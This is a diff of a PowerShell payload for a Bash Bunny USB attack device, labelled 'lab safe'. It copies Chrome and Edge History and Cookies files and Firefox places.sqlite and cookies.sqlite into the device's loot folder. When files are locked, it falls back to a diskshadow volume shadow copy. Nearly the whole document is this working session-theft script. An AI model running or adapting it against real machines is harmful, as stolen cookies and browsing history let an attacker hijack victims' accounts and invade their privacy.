@@ -1,15 +1,43 @@
-$loot = "C:\Users\Public\browser_artifacts"
-New-Item -ItemType Directory -Force -Path $loot | Out-Null
+#############################################
+#  Browser Artifact Collector (Lab Safe)
+#  Saves directly to Bash Bunny loot folder
+#############################################
 
-# Helper for safe copy of locked files
+# --- Detect Bash Bunny drive ---
+$usb = Get-WmiObject Win32_LogicalDisk |
+    Where-Object {
+        $_.DriveType -eq 2 -and (Test-Path "$($_.DeviceID)\loot")
+    } |
+    Select-Object -ExpandProperty DeviceID
+
+if (-not $usb) {
+    Write-Output "[-] Bash Bunny drive not found."
+    exit
+}
+
+Write-Output "[+] Bash Bunny detected on $usb"
+
+# --- Set loot directory ---
+$loot = "$usb\loot\browser_artifacts"
+New-Item -ItemType Directory -Force -Path $loot | Out-Null
+Write-Output "[+] Loot folder: $loot"
+
+
+#############################################
+#   Function: Safe Copy (shadow-copy fallback)
+#############################################
+
 function Copy-Safe {
     param($source, $dest)
+
     try {
         Copy-Item $source $dest -ErrorAction Stop
+        return
     } catch {
-        # Copy shadow copy fallback (safe technique)
-        $shadow = "C:\shadow_tmp"
-        diskshadow /s { 
+        # Try shadow-copy fallback
+        Write-Output "[-] Normal copy failed for $source, attempting shadow copy..."
+
+        diskshadow /s {
             SET CONTEXT PERSISTENT
             BEGIN BACKUP
             ADD VOLUME C: ALIAS vol1
@@ -19,11 +47,21 @@ function Copy-Safe {
 
         $shadowPath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1"
         $fullPath = $source.Replace("C:", $shadowPath)
-        Copy-Item $fullPath $dest -Force
+
+        try {
+            Copy-Item $fullPath $dest -Force
+            Write-Output "[+] Shadow copy successful for: $source"
+        } catch {
+            Write-Output "[-] Shadow copy failed for: $source"
+        }
     }
 }
 
-# Chrome (User Data)
+
+#############################################
+#          Chrome Collection
+#############################################
+
 $chromePaths = @(
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
@@ -39,7 +77,11 @@ foreach ($path in $chromePaths) {
     }
 }
 
-# Edge
+
+#############################################
+#              Edge Collection
+#############################################
+
 $edgePaths = @(
     "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History",
     "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
@@ -55,9 +97,13 @@ foreach ($path in $edgePaths) {
     }
 }
 
-# Firefox (Profiles)
+
+#############################################
+#             Firefox Collection
+#############################################
+
 $ffBase = "$env:APPDATA\Mozilla\Firefox\Profiles"
-$ffDest = "$loot\Firefox"
+$ffDest  = "$loot\Firefox"
 
 if (Test-Path $ffBase) {
     New-Item -ItemType Directory -Force -Path $ffDest | Out-Null
@@ -66,9 +112,14 @@ if (Test-Path $ffBase) {
         $pDest = "$ffDest\$($profile.Name)"
         New-Item -ItemType Directory -Force -Path $pDest | Out-Null
 
-        Copy-Safe "$($profile.FullName)\places.sqlite" $pDest
+        Copy-Safe "$($profile.FullName)\places.sqlite"  $pDest
         Copy-Safe "$($profile.FullName)\cookies.sqlite" $pDest
     }
 }
 
-Write-Output "Browser artifact collection complete."
+
+#############################################
+#                Done
+#############################################
+
+Write-Output "[+] Browser artifact collection complete."
